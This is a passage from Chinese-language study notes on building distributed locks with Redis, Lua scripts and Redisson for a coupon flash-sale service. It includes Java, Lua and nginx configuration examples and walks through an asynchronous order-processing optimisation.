        long orderId = redisIdWorker.nextId("order");
        voucherOrder.setId(orderId);  // 订单id
        voucherOrder.setUserId(userId);  // 用户id
        voucherOrder.setVoucherId(voucherId);  // 代金券id
        save(voucherOrder);
        // 返回订单id
        return Result.ok(orderId);
    }

}
```

[^0]: 事务要生效，必须拿到代理对象。看视频。

#### 一人一单的并发安全问题

通过加锁可以解决在单机情况下的一人一单安全问题，但是在集群模式下就不行了。

将服务启动两份（拷贝启动项），端口分别为8081和8082（通过VM options：`-Dserver.port=8082`指定）：

然后修改nginx的conf目录下的nginx.conf文件，配置反向代理和负载均衡：

```
worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/json;

    sendfile        on;
    
    keepalive_timeout  65;

    server {
        listen       8080;
        server_name  localhost;
        # 指定前端项目所在的位置
        location / {
            root   html/hmdp;
            index  index.html index.htm;
        }

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }


        location /api {  
            default_type  application/json;
            #internal;  
            keepalive_timeout   30s;  
            keepalive_requests  1000;  
            #支持keep-alive  
            proxy_http_version 1.1;  
            rewrite /api(/.*) $1 break;  
            proxy_pass_request_headers on;
            #more_clear_input_headers Accept-Encoding;  
            proxy_next_upstream error timeout;  
            #proxy_pass http://127.0.0.1:8081;
            proxy_pass http://backend;
        }
    }

    upstream backend {
        server 127.0.0.1:8081 max_fails=5 fail_timeout=10s weight=1;
        server 127.0.0.1:8082 max_fails=5 fail_timeout=10s weight=1;
    }  
}
```

重新加载配置文件：

```sh
nginx.exe -s reload
```

现在，用户请求会在这两个节点上负载均衡（向localhost:8080/api/voucher/list/1接口发送多次请求，可以看到在8081与8082节点上都有请求），再次测试下是否存在线程安全问题。可以在`seckillVoucher`的`synchronized`代码块内打断点调试，并发送两次请求（相同用户），可以看到两次请求都进入`synchronized`代码块。因为JVM内部维护了锁监视器对象，集群模式（或分布式系统）下有多个JVM，它们有各自的锁监视器对象。

### 分布式锁

分布式锁就是满足分布式系统或集群模式下多进程可见并且互斥的锁。它的特性如下：

- 多进程可见。JVM外部资源大多能做到，例如使用Redis、MySQL实现。
- 互斥。
- 高可用。
- 高性能（获取锁的动作要快）。
- 安全性（锁不会因为异常而处于错误状态，例如死锁）。
- ……

分布式锁的核心是实现多进程之间互斥，而满足这一点的方式有很多，常见的有三种：

|        | MySQL                     | Redis                     | Zookeeper                        |
| ------ | ------------------------- | ------------------------- | -------------------------------- |
| 互斥   | 利用MySQL本身的互斥锁机制 | 利用`setnx`这样的互斥命令 | 利用节点的唯一性和有序性实现互斥 |
| 高可用 | 好                        | 好                        | 好                               |
| 高性能 | 一般                      | 好                        | 一般                             |
| 安全性 | 断开连接，自动释放锁      | 利用锁超时时间，到期释放  | 临时节点，断开连接自动释放       |

#### 基于Redis的分布式锁

实现分布式锁时需要实现的两个基本方法：

- 获取锁。要求互斥，确保只有一个线程获取锁。

  ```sh
  # 添加锁，利用setnx的互斥特性
  SETNX lock thread1
  # 添加锁过期时间，避免服务宕机引起的死锁
  EXPIRE lock 10
  ```

  添加锁与添加锁过期时间的操作必须是原子的，因此可以这么做：

  ```sh
  SET lock thread1 EX 10 NX
  ```

- 释放锁。手动释放。如果获取锁以后，服务宕机，则释放锁的动作永远不会执行。因此，要使用超时释放机制，即获取锁时添加一个超时时间。

  ```sh
  # 释放锁，删除即可
  DEL key
  ```

如果获取锁失败，有两种可能：堵塞等待，直到锁被释放；非堵塞，如果获取锁失败，立即结束，返回一个结果。这里实现非堵塞机制。

#### 基于Redis实现分布式锁初级版本

需求：定义一个类，实现接口`ILock`，利用Redis实现分布式锁功能。

```java
package com.hmdp.utils;

public interface ILock {

    /**
     * 尝试获取锁
     * @param timeoutSec 锁持有的超时时间，过期后自动释放
     * @return true代表获取锁成功; false代表获取锁失败
     */
    boolean tryLock(long timeoutSec);

    /**
     * 释放锁
     */
    void unlock();

}
```

```java
package com.hmdp.utils;

import org.springframework.data.redis.core.StringRedisTemplate;

import java.util.concurrent.TimeUnit;

public class SimpleRedisLock implements ILock {

    /**
     * 业务名称，也就是锁的名称
     */
    private final String name;

    private final StringRedisTemplate stringRedisTemplate;

    public SimpleRedisLock(String name, StringRedisTemplate stringRedisTemplate) {
        this.name = name;
        this.stringRedisTemplate = stringRedisTemplate;
    }

    /**
     * 锁的统一前缀
     */
    private static final String KEY_PREFIX = "lock:";

    @Override
    public boolean tryLock(long timeoutSec) {
        // 获取线程标识
        long threadId = Thread.currentThread().getId();
        // 获取锁
        Boolean success = stringRedisTemplate.opsForValue().setIfAbsent(KEY_PREFIX + name, threadId + "", timeoutSec, TimeUnit.SECONDS);
        return Boolean.TRUE.equals(success);  // 防止拆箱过程中出现空指针异常
    }

    @Override
    public void unlock() {
        // 释放锁
        stringRedisTemplate.delete(KEY_PREFIX + name);
    }

}
```

下面修改`VoucherOrderServiceImpl`类的`seckillVoucher`方法：

```java
import com.hmdp.utils.SimpleRedisLock;
import org.springframework.data.redis.core.StringRedisTemplate;

@Resource
private StringRedisTemplate stringRedisTemplate;

@Override
public Result seckillVoucher(Long voucherId) {
    // 查询优惠券
    SeckillVoucher voucher = seckillVoucherService.getById(voucherId);
    // 判断秒杀是否开始
    if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {
        // 尚未开始
        return Result.fail("秒杀尚未开始！");
    }
    // 判断秒杀是否已经结束
    if (voucher.getEndTime().isBefore(LocalDateTime.now())) {
        return Result.fail("秒杀已经结束！");
    }
    // 判断库存是否充足
    if (voucher.getStock() < 1) {
        // 库存不足
        return Result.fail("库存不足！");
    }
    Long userId = UserHolder.getUser().getId();
    // 创建锁对象
    SimpleRedisLock lock = new SimpleRedisLock("order:" + userId, stringRedisTemplate);
    // 获取锁
    boolean isLock = lock.tryLock(5);  // 如果要测试，请设置较长时间
    // 判断是否获取锁成功
    if (!isLock) {
        // 获取锁失败，返回错误或重试
        // 这里返回错误，防止请求攻击
        return Result.fail("不允许重复下单");
    }
    try {
        // 获取代理对象（事务）
        IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy();
        return proxy.createVoucherOrder(voucherId);
    } finally {
        // 释放锁
        lock.unlock();
    }

}
```

在大多数情况下，该锁能够正常工作，但是在一些极端情况下它依然存在一些问题：

- 线程1获取锁成功，但是因为某种原因，业务执行堵塞过长，超过设置的超时时间，因此锁被提前释放。
- 线程2在锁释放后获取锁成功，并执行业务。
- 线程1完成业务，（线程2的）锁被释放。
- 线程3此时获取锁成功，并执行业务。

之所以会这样，一是因为业务堵塞导致锁被释放，二是因为释放了其他线程的锁。因此在释放锁时需要判断锁的标识与当前线程是否一致。

#### 改进Redis的分布式锁

需求：修改之前的分布式锁实现，满足：

- 在获取锁时存入线程标识（可以用UUID区分多个JVM，因为集群模式下，多个JVM可能出现线程ID冲突情况）。
- 在释放锁时先获取锁中的线程标识，判断是否与当前线程标识一致。
  - 如果一致则释放锁。
  - 如果不一致则不释放锁。

修改`SimpleRedisLock`类：

```java
package com.hmdp.utils;

import cn.hutool.core.lang.UUID;
import org.springframework.data.redis.core.StringRedisTemplate;

import java.util.concurrent.TimeUnit;

public class SimpleRedisLock implements ILock {

    /**
     * 业务名称，也就是锁的名称
     */
    private final String name;

    private final StringRedisTemplate stringRedisTemplate;

    public SimpleRedisLock(String name, StringRedisTemplate stringRedisTemplate) {
        this.name = name;
        this.stringRedisTemplate = stringRedisTemplate;
    }

    /**
     * 锁的统一前缀
     */
    private static final String KEY_PREFIX = "lock:";

    /**
     * 线程ID前缀
     */
    private static final String ID_PREFIX = UUID.randomUUID().toString(true) + "-";

    @Override
    public boolean tryLock(long timeoutSec) {
        // 获取线程标识
        String threadId = ID_PREFIX + Thread.currentThread().getId();
        // 获取锁
        Boolean success = stringRedisTemplate.opsForValue().setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS);
        return Boolean.TRUE.equals(success);  // 防止拆箱过程中出现空指针异常
    }

    @Override
    public void unlock() {
        // 获取线程标识
        String threadId = ID_PREFIX + Thread.currentThread().getId();
        // 获取锁中标识
        String id = stringRedisTemplate.opsForValue().get(KEY_PREFIX + name);
        // 判断标识是否一致
        if(threadId.equals(id)) {
            // 释放锁
            stringRedisTemplate.delete(KEY_PREFIX + name);
        }
    }

}
```

由于判断锁中的线程标识是否与当前线程标识一致以及释放锁的动作并非原子的，同时在这期间可能发生堵塞（例如JVM垃圾回收堵塞进程），锁可能过期，导致其他线程获取锁成功，随后该线程释放不属于自己的锁，导致相同的并发问题。

#### Redis的Lua脚本

可以Redis事务（保证原子性，不保证一致性）结合乐观锁机制解决上述问题，但是比较复杂。

Redis提供了[Lua](http://www.lua.org/)脚本功能，在一个脚本中编写多条Redis命令，确保多条命令执行时的原子性。

Lua为Redis提供的调用函数，语法如下：

```lua
-- 执行redis命令
redis.call('命令名称', 'key', '其它参数', ...)
```

例如，要执行`set name jack`，则脚本如下：

```lua
-- 执行 set name jack
redis.call('set', 'name', 'jack')
```

例如，要先执行`set name Rose`，再执行`get name`，则脚本如下：

```lua
-- 先执行 set name jack
redis.call('set', 'name', 'jack')
-- 再执行 get name
local name = redis.call('get', 'name')
-- 返回
return name
```

写好脚本以后，需要用Redis命令来调用脚本，查看脚本的相关命令：

```sh
help @scripting
```

其中`EVAL`是调用脚本的常见命令。例如，要执行`redis.call('set', 'name', 'jack') `这个脚本，语法如下：

```sh
# 调用脚本
# 参数：脚本内容 + 脚本需要的键类型的参数个数
EVAL "return redis.call('set', 'name', 'jack')"  0
```

如果脚本中的键、值不想写死，可以作为参数传递。键类型参数会放入`KEYS`数组，其它参数会放入`ARGV`数组，在脚本中可以从`KEYS`和`ARGV`数组获取这些参数：

```sh
# 调用脚本
# 参数：脚本内容 + 脚本需要的键类型的参数个数 + 传递的参数
# 数组的下标从1开始
EVAL "return redis.call('set', KEYS[1], ARGV[1])" 1 name Rose
```

释放锁的业务流程是这样的：

- 获取锁中的线程标识。

- 判断是否与指定的标识（当前线程标识）一致。

- 如果一致则释放锁（删除）。

- 如果不一致则什么都不做。

如果用Lua脚本来表示则是这样的：

```lua
-- 这里的KEYS[1]就是锁的键，这里的ARGV[1]就是当前线程标识
-- 获取锁中的标识，判断是否与当前线程标示一致
if (redis.call('GET', KEYS[1]) == ARGV[1]) then
  -- 一致，则删除锁
	return redis.call('DEL', KEYS[1])
end
-- 不一致，则直接返回
return 0
```

#### 再次改进Redis的分布式锁

需求：基于Lua脚本实现分布式锁的释放锁逻辑。

`RedisTemplate`调用Lua脚本的API如下：

```java
@Override
public <T> T execute(RedisScript<T> script, List<K> keys, Object... args) {
   return scriptExecutor.execute(script, keys, args);
}
```

下载Emmylua插件。

在src/main/resources目录下，创建Lua脚本unlock.lua（不建议将脚本写在.java文件中写死，否则不便于维护）：

```lua
-- 比较线程标识与锁中的标识是否一致
if (redis.call('GET', KEYS[1]) == ARGV[1]) then
    -- 释放锁
    return redis.call('DEL', KEYS[1])
end
return 0
```

修改释放锁操作：

```java
import org.springframework.data.redis.core.script.DefaultRedisScript;
import org.springframework.core.io.ClassPathResource;
import java.util.Collections;

private static final DefaultRedisScript<Long> UNLOCK_SCRIPT;

static {
    // 提前读取脚本，防止每次调用释放锁的操作都进行IO
    UNLOCK_SCRIPT = new DefaultRedisScript<>();
    UNLOCK_SCRIPT.setLocation(new ClassPathResource("unlock.lua"));
    UNLOCK_SCRIPT.setResultType(Long.class);
}

@Override
public void unlock() {
    // 调用Lua脚本
    stringRedisTemplate.execute(UNLOCK_SCRIPT, Collections.singletonList(KEY_PREFIX + name), ID_PREFIX + Thread.currentThread().getId());
}
```

总结一下，基于Redis的分布式锁实现思路：

- 利用`set nx ex`获取锁，并设置过期时间，保存线程标识。
- 释放锁时先判断线程标识是否与自己一致，一致则删除锁。

特性：

- 利用`set nx`满足互斥性。
- 利用`set ex`保证故障时锁依然能释放，避免死锁，提高安全性。
- 利用Redis集群保证高可用和高并发特性。

### 基于Redis的分布式锁优化

基于`setnx`实现的分布式锁存在下面的问题：

- 不可重入：同一个线程无法多次获取同一把锁。
- 不可重试：获取锁只尝试一次就返回`false`，没有重试机制。
- 超时释放：锁超时释放虽然可以避免死锁，但如果是业务执行耗时较长，也会导致锁释放，存在安全隐患。
- 主从一致性：如果Redis提供了主从集群，主从同步存在延迟，当主宕机时，从节点（选出的作为新的主节点的节点）未完成同步操作，导致从节点中没有锁的标识，造成安全问题。这出现的概率较低，因为主从同步延迟很低。

这四个问题要么发生概率极低，要么不一定有这样的需求，因此它们是功能拓展。大多数场景下，之前实现的锁已经够用。

#### Redisson

[Redisson](https://redisson.org)是一个在Redis的基础上实现的Java驻内存数据网格（In-Memory Data Grid）（即在Redis基础上实现的分布式工具集合）。它不仅提供了一系列的分布式的Java常用对象，还提供了许多分布式服务，其中就包含了各种分布式锁的实现。GitHub地址为：https://github.com/redisson/redisson。

引入依赖：

```xml
<dependency>
    <groupId>org.redisson</groupId>
    <artifactId>redisson</artifactId>
    <version>3.13.6</version>
</dependency>
```

配置Redisson客户端：

```java
package com.hmdp.config;

import org.redisson.Redisson;
import org.redisson.api.RedissonClient;
import org.redisson.config.Config;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class RedissonConfig {

    @Bean
    public RedissonClient redissonClient() {
        // 配置类
        Config config = new Config();
        // 添加redis地址，这里添加了单点的地址，也可以使用config.useClusterServers方法添加集群地址
        config.useSingleServer().setAddress("redis://192.168.242.138:6379").setPassword("123456");
        // 创建客户端
        return Redisson.create(config);
    }

}
```

使用Redisson的分布式锁：

```java
import org.redisson.api.RLock;
import org.redisson.api.RedissonClient;

@Resource
private RedissonClient redissonClient;

@Test
public void testRedisson() throws InterruptedException {
    // 获取锁（可重入），指定锁的名称
    RLock lock = redissonClient.getLock("anyLock");
    // 尝试获取锁，参数分别是：获取锁的最大等待时间（期间会重试）、锁自动释放时间、时间单位
    boolean isLock = lock.tryLock(1, 10, TimeUnit.SECONDS);
    // 判断释放获取成功
    if (isLock) {
        try {
            System.out.println("执行业务");
        } finally {
            // 释放锁
            lock.unlock();
        }
    }
}
```

使用Redisson的分布式锁替换之前的锁实现`VoucherOrderServiceImpl`的`seckillVoucher`方法，只需改变创建锁对象的代码：

```java
import org.redisson.api.RLock;
import org.redisson.api.RedissonClient;

@Resource
private RedissonClient redissonClient;

// 创建锁对象
RLock lock = redissonClient.getLock("lock:order:" + userId);
// 获取锁，最大等待时间为-1（不重试），锁自动释放时间为30秒
boolean isLock = lock.tryLock();
```

#### Redisson可重入锁原理

为了实现可重入锁，需要为每个锁关联一个计数值。每次线程执行`tryLock`，计数值加1（第一次执行计数值就是1）；执行`unlock`，计数值减1。当锁的计数值为0时完成释放锁的操作。

在Redis中，可以使用哈希结构记录线程id和重入次数，它的键表示锁，哈希键表示线程标识，而哈希值表示计数值。线程首先需要判断锁是否存在。如果不存在，则获取锁并添加线程标识（并将计数值设为1），然后设置锁有效期（因为哈希结构没有`nx`参数，不能同时获取锁并设置锁有效期），然后执行业务；如果存在，则判断锁标识是否是自己，如果不是，则获取锁失败；否则将锁计数加1，重置锁的有效期，执行业务。业务执行完成，需要判断锁是否是自己的，如果不是，则锁已释放；否则将锁计数减1，判断锁计数是否为0，如果是，则释放锁，否则重置锁的有效期，并继续执行业务。

获取锁的Lua脚本如下：

```lua
local key = KEYS[1];  -- 锁的键
local threadId = ARGV[1];  -- 线程唯一标识
local releaseTime = ARGV[2];  -- 锁的自动释放时间
-- 判断是否存在
if(redis.call('exists', key) == 0) then
    -- 不存在, 获取锁
    redis.call('hset', key, threadId, '1');
    -- 设置有效期
    redis.call('expire', key, releaseTime);
    return 1;  -- 返回结果
end;
-- 锁已经存在，判断threadId是否是自己
if(redis.call('hexists', key, threadId) == 1) then
    -- 不存在, 获取锁，重入次数+1
    redis.call('hincrby', key, threadId, '1');
    -- 设置有效期
    redis.call('expire', key, releaseTime);
    return 1;  -- 返回结果    
end;
return 0;  -- 代码走到这里,说明获取锁的不是自己，获取锁失败
```

释放锁的Lua脚本：

```lua
local key = KEYS[1];  -- 锁的键
local threadId = ARGV[1];  -- 线程唯一标识
local releaseTime = ARGV[2];  -- 锁的自动释放时间
-- 判断当前锁是否还是被自己持有
if (redis.call('HEXISTS', key, threadId) == 0) then
    return nil;  -- 如果已经不是自己，则直接返回
end;
-- 是自己的锁，则重入次数-1
local count = redis.call('HINCRBY', key, threadId, -1);
-- 判断是否重入次数是否已经为0
if (count > 0) then
    -- 大于0说明不能释放锁，重置有效期然后返回
    redis.call('EXPIRE', key, releaseTime);
    return nil;    
else  -- 等于0说明可以释放锁，直接删除
    redis.call('DEL', key);    
    return nil;    
end;   
```

测试Redisson的实现：

```java
package com.hmdp;

import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.redisson.api.RLock;
import org.redisson.api.RedissonClient;
import org.springframework.boot.test.context.SpringBootTest;

import javax.annotation.Resource;

@Slf4j
@SpringBootTest
public class RedissonTest {

    @Resource
    private RedissonClient redissonClient;

    private RLock lock;

    @BeforeEach
    public void setUp() {
        lock = redissonClient.getLock("order");
    }

    @Test
    public void method1() {
        // 尝试获取锁
        boolean isLock = lock.tryLock();
        if (!isLock) {
            log.error("获取锁失败 .... 1");
            return;
        }
        try {
            log.info("获取锁成功 .... 1");
            method2();
            log.info("开始执行业务 ... 1");
        } finally {
            log.warn("准备释放锁 .... 1");
            lock.unlock();
        }
    }

    public void method2() {
        // 尝试获取锁
        boolean isLock = lock.tryLock();
        if (!isLock) {
            log.error("获取锁失败 .... 2");
            return;
        }
        try {
            log.info("获取锁成功 .... 2");
            log.info("开始执行业务 ... 2");
        } finally {
            log.warn("准备释放锁 .... 2");
            lock.unlock();
        }
    }

}
```

当`method1`获取锁成功后，Redis有相应的记录，且重入次数为1；当`method2`获取锁成功后，相应记录的重入次数为2；当`method2`执行`unlock`后，相应记录的重入次数为1；当`method1`执行`unlock`后，相应记录被删除。

#### Redisson锁重试原理

`RedissonLock`获取锁的原理（假设设置了锁的最大等待时间）：

1. 线程尝试获取锁，如果获取成功，返回的TTL为`null`，否则它表示锁的剩余有效期。Lua脚本如下（位于`org.redisson.RedissonLock`类中）：

   ```java
   <T> RFuture<T> tryLockInnerAsync(long waitTime, long leaseTime, TimeUnit unit, long threadId, RedisStrictCommand<T> command) {
       internalLockLeaseTime = unit.toMillis(leaseTime);
   
       return evalWriteAsync(getName(), LongCodec.INSTANCE, command,
               "if (redis.call('exists', KEYS[1]) == 0) then " +
                       "redis.call('hincrby', KEYS[1], ARGV[2], 1); " +
                       "redis.call('pexpire', KEYS[1], ARGV[1]); " +
                       "return nil; " +
                       "end; " +
                       "if (redis.call('hexists', KEYS[1], ARGV[2]) == 1) then " +
                       "redis.call('hincrby', KEYS[1], ARGV[2], 1); " +
                       "redis.call('pexpire', KEYS[1], ARGV[1]); " +
                       "return nil; " +
                       "end; " +
                       "return redis.call('pttl', KEYS[1]);",
               Collections.singletonList(getName()), internalLockLeaseTime, getLockName(threadId));
   }
   ```

2. 如果返回的TTL为`null`，则判断`leaseTime`（锁自动释放时间）是否为-1。如果不为-1，则直接返回`true`；否则开启`watchDog`，不停地更新有效期，并返回`true`。

3. 如果TTL不为`null`，则判断剩余等待时间是否大于0。如果否，则返回`false`，否则订阅并等待释放锁的信号。在释放锁的脚本中，可以看到发布消息通知的代码（位于`org.redisson.RedissonLock`类中）：

   ```java
   protected RFuture<Boolean> unlockInnerAsync(long threadId) {
       return evalWriteAsync(getName(), LongCodec.INSTANCE, RedisCommands.EVAL_BOOLEAN,
               "if (redis.call('hexists', KEYS[1], ARGV[3]) == 0) then " +
                       "return nil;" +
                       "end; " +
                       "local counter = redis.call('hincrby', KEYS[1], ARGV[3], -1); " +
                       "if (counter > 0) then " +
                       "redis.call('pexpire', KEYS[1], ARGV[2]); " +
                       "return 0; " +
                       "else " +
                       "redis.call('del', KEYS[1]); " +
                       "redis.call('publish', KEYS[2], ARGV[1]); " +
                       "return 1; " +
                       "end; " +
                       "return nil;",
               Arrays.asList(getName(), getChannelName()), LockPubSub.UNLOCK_MESSAGE, internalLockLeaseTime, getLockName(threadId));
   }
   ```

4. 等待订阅结果，等待时间最大为锁的剩余等待时间，如果超时，则取消订阅，返回`false`；否则如果得到订阅结果，再次判断剩余等待时间是否大于0，如果小于等于0，返回`false`，否则不停循环步骤1~4的过程（实现稍有区别）。

`RedissonLock`释放锁的原理：

- 线程尝试释放锁，判断是否成功。如果失败，则记录异常；否则发送释放锁的消息，取消`watchDog`。

总之，Redisson锁重试的原理在于：

- 可重试：利用信号量和PubSub功能实现等待、唤醒，获取锁失败的重试机制。
- 超时续约：利用`watchDog`，每隔一段时间（`releaseTime / 3`），重置超时时间。

#### Redisson分布式锁主从一致性问题

在Redis主从模式中，集群中的一个Redis结点作为主节点（Redis Master），剩下结点作为从结点（Redis Slave）。主节点处理写操作，从节点处理读操作。主节点不断将数据同步到从节点。由于同步存在延迟，因此会发生主从一致性问题。

假设Java应用要执行`SET lock thread1 NX EX 10`命令获取锁，主节点会保存锁的标识`lock = thread1`，然后向从节点同步。但是同步尚未完成时，主节点发生故障。Redis中的哨兵会监控集群状态，它发现主节点宕机，因此客户端连接断开，并选择一个从节点作为新的主节点。此时Java应用访问新的主节点，发现锁失效。此时其他线程获取锁也能获取成功，出现并发问题。

Redisson的解决方案是：将多个Redis节点作为独立的Redis节点，相互之间没有关系。客户端必须依次获取每个Redis节点的锁，才算获取锁成功。这样就不会有一致性问题，且可用性随着节点增多而变高（少量节点宕机业务仍然可以继续）。这种方案被称为**联锁（multiLock）**。当客户端成功获取所有锁，如果指定了锁的有效期，则重新配置所有锁的有效期，保证所有锁的有效期一致（在这之前，越往后获取的锁的剩余有效期越长）；否则使用`watchDog`自动重置超时时间。如果获取锁失败（例如超时），则要释放已经获取到的锁。

同时还可以将这些独立的Redis节点作为主节点，给这些独立的Redis节点建立主从关系。此时即使某个主节点宕机，从节点被选为新的主节点，且没有同步数据，也不会造成一致性问题，除非所有主节点都宕机且数据未同步。

下面测试联锁，搭建三个Redis节点（可以使用3个虚拟机），然后修改配置：

```java
package com.hmdp.config;

import org.redisson.Redisson;
import org.redisson.api.RedissonClient;
import org.redisson.config.Config;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class RedissonConfig {

    @Bean
    public RedissonClient redissonClient() {
        Config config = new Config();
        config.useSingleServer().setAddress("redis://192.168.242.137:6379").setPassword("123456");
        return Redisson.create(config);
    }

    @Bean
    public RedissonClient redissonClient2() {
        Config config = new Config();
        config.useSingleServer().setAddress("redis://192.168.242.138:6379").setPassword("123456");
        return Redisson.create(config);
    }

    @Bean
    public RedissonClient redissonClient3() {
        Config config = new Config();
        config.useSingleServer().setAddress("redis://192.168.242.139:6379").setPassword("123456");
        return Redisson.create(config);
    }

}
```

修改`RedissonTest`：

```java
@Resource
private RedissonClient redissonClient2;

@Resource
private RedissonClient redissonClient3;

@BeforeEach
public void setUp() {
    RLock lock1 = redissonClient.getLock("order");
    RLock lock2 = redissonClient2.getLock("order");
    RLock lock3 = redissonClient3.getLock("order");
    // 创建联锁，使用哪个RedissonClient调用并不重要
    lock = redissonClient.getMultiLock(lock1, lock2, lock3);
}
```

获取锁成功后，可以看到三个节点都有相应记录；最终释放锁后，三个节点的相应记录都被删除。且在该过程中三个节点的可重入行为（即计数值）都正确。

不可重入Redis分布式锁利用`setnx`的互斥性；利用`ex`避免死锁；释放锁时判断线程标识，它的缺陷是不可重入、无法重试、锁超时失效。可重入的Redis分布式锁利用哈希结构，记录线程标识和重入次数；利用`watchDog`延续锁时间；利用信号量控制锁重试等待；它的缺陷是Redis宕机会引起锁失效。Redisson的`multiLock`则使用多个独立的Redis节点，必须在所有节点都获取重入锁，才算获取锁成功，它的缺陷是运维成本高、实现复杂。

### Redis优化秒杀

在数据库的`tb_user`表中插入1000个用户，并且登录，这样Redis中就有了这些用户的Token。清空订单表tb_voucher_order，使用JMeter对`/voucher-order/seckill/{id}`接口进行高并发测试（使用相同的`{id}`；发送HTTP请求时，在登录状态头中设置`authorization=${token}`，并在tokens中引用存放全部token的文件，将这些数据赋值给`token`），从聚合报告中可以看到请求响应时间较长，且吞吐量不大（尤其是随着并发量越来越大）。

前面实现的`VoucherOrderServiceImpl.seckillVoucher`方法是一个串行过程：查询优惠券$\rightarrow$判断秒杀库存$\rightarrow$查询订单$\rightarrow$校验一人一单$\rightarrow$减库存$\rightarrow$创建订单。其中第1、3、5、6步需要与数据库交互，并且业务加了分布式锁，导致业务性能低。这里可以将业务分为两部分：主线程执行秒杀资格的判断（第2、4步）；如果有资格，开启独立线程执行减库存并下单（第5、6步）。为了提高第一部分的效率，可以将优惠券、订单信息缓存在Redis中，因此秒杀资格的判断只需与Redis交互。秒杀资格判断将优惠券id、用户id与订单id保存到阻塞队列，返回订单id。独立线程异步读取队列中的信息，完成下单。

优惠券库存使用`String`保存，键为优惠券id，值为库存；要实现一人一单功能，还要采用`Set`结构，保存哪些用户已经购买了哪个优惠券。

总计一下，秒杀业务的优化思路为：

- 先利用Redis完成库存余量、一人一单判断，完成抢单业务。
- 再将下单业务放入阻塞队列，利用独立线程异步下单。

这个流程如下：判断库存是否充足，如果不充足，则返回1；如果充足，判断用户是否下单，如果是，返回2；否则扣减库存，将用户id存入当前优惠券的`Set`集合，并返回0。这部分内容采用Lua脚本实现以保证原子性。执行Lua脚本后，如果结果不是0，则返回异常信息；否则将优惠券id、用户id与订单id存入阻塞队列，并返回订单id，秒杀业务结束，用户已经可以使用id去付款了。一个独立线程则读取阻塞队列实现异步下单。

下面基于以上思想，改进秒杀业务，提高并发性能，需求：

- 新增秒杀优惠券的同时，将优惠券信息保存到Redis中。
- 基于Lua脚本，判断秒杀库存、一人一单，决定用户是否抢购成功。
- 如果抢购成功，将优惠券id和用户id封装后存入阻塞队列。
- 开启线程任务，不断从阻塞队列中获取信息，实现异步下单功能。

修改`VoucherServiceImpl`的`addSeckillVoucher`方法：

```java
import org.springframework.data.redis.core.StringRedisTemplate;
import static com.hmdp.utils.RedisConstants.SECKILL_STOCK_KEY;

@Resource
private StringRedisTemplate stringRedisTemplate;

@Override
@Transactional
public void addSeckillVoucher(Voucher voucher) {
    // 保存优惠券
    save(voucher);
    // 保存秒杀信息
    SeckillVoucher seckillVoucher = new SeckillVoucher();
    seckillVoucher.setVoucherId(voucher.getId());
    seckillVoucher.setStock(voucher.getStock());
    seckillVoucher.setBeginTime(voucher.getBeginTime());
    seckillVoucher.setEndTime(voucher.getEndTime());
    seckillVoucherService.save(seckillVoucher);
    // 保存秒杀库存到Redis
    stringRedisTemplate.opsForValue().set(SECKILL_STOCK_KEY + voucher.getId(), voucher.getStock().toString());
}
```

在src\main\resources目录下，创建seckill.lua脚本：

```lua
-- 优惠券id
local voucherId = ARGV[1]
-- 用户id
local userId = ARGV[2]

-- 库存键
local stockKey = 'seckill:stock:' .. voucherId
-- 订单键
local orderKey = 'seckill:order:' .. voucherId

-- 判断库存是否充足
if (tonumber(redis.call('get', stockKey)) <= 0) then
    -- 库存不足，返回1
    return 1
end
-- 判断用户是否下单
if (redis.call('sismember', orderKey, userId) == 1) then
    -- 存在，说明是重复下单，返回2
    return 2
end
-- 扣库存
redis.call('incrby', stockKey, -1)
-- 下单（保存用户）
redis.call('sadd', orderKey, userId)
return 0
```

修改服务类：

```java
package com.hmdp.service;

import com.hmdp.dto.Result;
import com.hmdp.entity.VoucherOrder;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IVoucherOrderService extends IService<VoucherOrder> {

    Result seckillVoucher(Long voucherId);

    void createVoucherOrder(VoucherOrder voucherOrder);
}
```

```java
package com.hmdp.service.impl;

import com.hmdp.dto.Result;
import com.hmdp.entity.VoucherOrder;
import com.hmdp.mapper.VoucherOrderMapper;
import com.hmdp.service.ISeckillVoucherService;
import com.hmdp.service.IVoucherOrderService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.hmdp.utils.RedisIdWorker;
import com.hmdp.utils.UserHolder;
import lombok.extern.slf4j.Slf4j;
import org.redisson.api.RLock;
import org.redisson.api.RedissonClient;
import org.springframework.aop.framework.AopContext;
import org.springframework.core.io.ClassPathResource;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.data.redis.core.script.DefaultRedisScript;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import java.util.Collections;
import java.util.concurrent.*;

@Slf4j
@Service
public class VoucherOrderServiceImpl extends ServiceImpl<VoucherOrderMapper, VoucherOrder> implements IVoucherOrderService {

    @Resource
    private ISeckillVoucherService seckillVoucherService;

    @Resource
    private RedisIdWorker redisIdWorker;

    @Resource
    private StringRedisTemplate stringRedisTemplate;


    @Resource
    private RedissonClient redissonClient;

    private static final DefaultRedisScript<Long> SECKILL_SCRIPT;

    static {
        SECKILL_SCRIPT = new DefaultRedisScript<>();
        SECKILL_SCRIPT.setLocation(new ClassPathResource("seckill.lua"));
        SECKILL_SCRIPT.setResultType(Long.class);
    }

    private final BlockingQueue<VoucherOrder> orderTasks = new ArrayBlockingQueue<>(1024 * 1024);

    private static final ExecutorService SECKILL_ORDER_EXECUTOR = Executors.newSingleThreadExecutor();  // 处理订单不要求速度快

    @PostConstruct  // 在当前类初始化完成后执行
    private void init() {
        SECKILL_ORDER_EXECUTOR.submit(new VoucherOrderHandler());
    }

    private class VoucherOrderHandler implements Runnable {
        @Override
        public void run() {
            while (true) {
                try {
                    // 获取队列中的订单信息
                    VoucherOrder voucherOrder = orderTasks.take();
                    // 创建订单
